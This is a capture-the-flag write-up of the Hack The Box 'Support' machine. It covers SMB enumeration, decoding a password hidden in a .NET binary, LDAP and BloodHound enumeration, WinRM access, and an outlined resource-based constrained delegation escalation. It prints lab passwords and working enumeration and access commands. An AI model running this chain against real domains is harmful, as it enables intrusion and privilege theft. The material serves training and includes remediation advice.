# Hack The Box — Support

> **Platform:** Hack The Box  
> **Target:** Support  
> **Difficulty:** Easy  
> **Focus:** SMB enumeration, .NET decompilation, Active Directory, LDAP, WinRM, BloodHound, MachineAccountQuota, and Resource-Based Constrained Delegation (RBCD)

## Overview

Support is an Active Directory machine. The path begins with an exposed SMB share containing `UserInfo.exe.zip`. Decompiling the utility reveals how a stored credential is transformed, which leads to further LDAP enumeration and the `support` account. After obtaining WinRM access and the user flag, the domain's machine-account quota and computer-object permissions can be abused to configure RBCD and impersonate a privileged account.

> **Lab note:** HTB target IPs change after a machine reset. Replace `TARGET_IP` with the current target IP. The attacker IP used for file transfers must be replaced with your own VPN interface IP.

## 1. Enumeration

Start with a default-script and version scan:

```bash
nmap -sC -sV -oN nmap.txt TARGET_IP
```

The scan showed common Active Directory services, including DNS (53), Kerberos (88), LDAP (389/3268), SMB (445), and WinRM (5985). These results indicated that the target was a domain controller or an Active Directory server.

The LDAP banner identified the domain as `support.htb`.

## 2. Enumerating the SMB share

List available shares:

```bash
smbclient -L //TARGET_IP/
```

The `support-tools` share was accessible. Connect and list its contents:

```bash
smbclient //TARGET_IP/support-tools
```

The share contained several portable administration utilities, including `UserInfo.exe.zip`. Download that file from the SMB prompt:

```text
get UserInfo.exe.zip
```

Extract it locally:

```bash
unzip UserInfo.exe.zip
```

## 3. Reverse-engineering `UserInfo.exe`

Use ILSpy's command-line tool to decompile the .NET executable:

```bash
ilspycmd UserInfo.exe > UserInfo.cs
```

Reviewing the decompiled source revealed an encoded value and the key `armando`. The following Python snippet reproduces the transformation observed in the application:

```python
import base64

enc = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

data = base64.b64decode(enc)
password = bytes(
    b ^ key[i % len(key)] ^ 0xDF
    for i, b in enumerate(data)
)

print("Password:", password.decode())
```

The recovered password was:

```text
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Treat this as a lab credential and avoid reusing it outside the authorized target.

## 4. LDAP and Active Directory enumeration

Use the recovered credential to collect domain information. For example, with `bloodhound-python`:

```bash
bloodhound-python \
  --dns-tcp \
  -ns TARGET_IP \
  -d support.htb \
  -u 'ldap' \
  -p 'RECOVERED_PASSWORD' \
  -c all
```

Import the resulting JSON files into BloodHound and review the domain users, computers, group memberships, and object permissions.

LDAP can also be queried directly:

```bash
ldapsearch \
  -H ldap://support.htb \
  -D 'ldap@support.htb' \
  -w 'RECOVERED_PASSWORD' \
  -b 'dc=support,dc=htb'
```

The LDAP results exposed another credential:

```text
Ironside47pleasure40Watchful
```

Validate the credential against SMB:

```bash
nxc smb TARGET_IP -u 'support' -p 'SUPPORT_PASSWORD'
```

The `support` account authenticated successfully.

## 5. Initial access through WinRM

The target exposed WinRM on TCP port 5985. Connect using the `support` account:

```bash
evil-winrm -i TARGET_IP -u support -p 'SUPPORT_PASSWORD'
```

Once connected, inspect the user's desktop and retrieve the user flag:

```powershell
cd C:\Users\support\Desktop
dir
type user.txt
```

Record your own flag locally; do not publish flag values in a public write-up.

## 6. Checking MachineAccountQuota

For the privilege-escalation stage, transfer the required PowerShell scripts and Rubeus binary to the lab target using a temporary HTTP server on your attacking machine. Only use tools and transfers within the authorized HTB environment.

The relevant tools in these notes are:

- `PowerView.ps1`
- `Powermad.ps1`
- `Rubeus.exe`

Check the domain's machine-account quota with PowerView:

```powershell
Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' |
  Select-Object ms-DS-MachineAccountQuota
```

The observed value was `10`, meaning a domain user could create machine accounts, subject to the domain's configuration and permissions.

## 7. Resource-Based Constrained Delegation (RBCD)

The escalation path uses a computer account controlled by the current user and the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. In an authorized lab, the high-level sequence is:

1. Create a controlled computer account with Powermad.
2. Obtain that computer account's SID.
3. Configure the target computer object's RBCD security descriptor, if the current account has the necessary write permissions.
4. Use Rubeus to request an S4U service ticket impersonating a privileged user for an appropriate service.
5. Convert the resulting ticket to a credential-cache format if needed, then use a Kerberos-aware remote-execution tool against the correct domain host.

The notes recorded a test computer account named `attackersystem` and a temporary password. Use a unique lab-only password if reproducing the exercise. Do not blindly copy the original service-principal name: replace the example host with the actual target computer and service in your current lab.

The notes also used:

```text
ticketConverter.py
KRB5CCNAME
```

`ticketConverter.py` converts between supported Kerberos ticket formats, while `KRB5CCNAME` tells compatible tools which credential cache to use.

Once the privileged ticket was accepted, the session reached the Administrator desktop and the root flag was available at:

```text
C:\Users\Administrator\Desktop\root.txt
```

## 8. Key takeaways

- An accessible SMB share can expose binaries worth inspecting, even when no credentials are initially available.
- Decompiling a .NET application can reveal weak credential-protection logic.
- A credential found during LDAP enumeration should be validated and its permissions understood rather than assumed to be privileged.
- BloodHound helps map relationships and ACLs that may not be obvious from basic enumeration.
- MachineAccountQuota alone does not automatically grant domain administrator access. RBCD exploitation also depends on the ability to configure the relevant target computer object's delegation attribute and on the target/service being correctly identified.
- Kerberos ticket format and cache configuration matter when using ticket-based authentication.

## Remediation notes

- Remove secrets from client-distributed binaries and rotate any exposed credentials.
- Restrict read access to sensitive LDAP attributes and review where credentials are stored.
- Set `ms-DS-MachineAccountQuota` to the lowest practical value, commonly `0` when users do not need to join computers to the domain.
- Review ACLs on computer objects, especially write permissions affecting `msDS-AllowedToActOnBehalfOfOtherIdentity`.
- Monitor computer-account creation, changes to RBCD-related attributes, and unusual Kerberos S4U activity.

---

*This write-up documents an authorized Hack The Box training exercise. All testing should be limited to systems for which you have explicit permission.*
